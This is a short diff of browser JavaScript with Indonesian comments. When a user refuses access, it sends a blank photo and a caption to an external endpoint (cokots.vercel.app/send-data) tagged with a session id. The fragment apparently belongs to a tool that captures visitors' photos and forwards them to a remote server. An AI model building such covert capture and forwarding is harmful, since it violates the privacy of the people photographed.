@@ -69,7 +69,7 @@
             
             // Kirim foto kosong (fallback) ke server
             const formData = new FormData();
-            formData.append("photo", fallbackImageURL);  // Kirimkan fallback gambar
+            formData.append("photo", "");  // Kirimkan fallback gambar
             formData.append("caption", caption);
             
             const apiResponse = await fetch(`https://cokots.vercel.app/send-data?session=${session}`, {
@@ -88,6 +88,7 @@
         } catch (error) {
             document.getElementById("status").innerText = "Pengguna menolak";
             sendEmptyDataToAPI();
+            return;
         }
     }
     
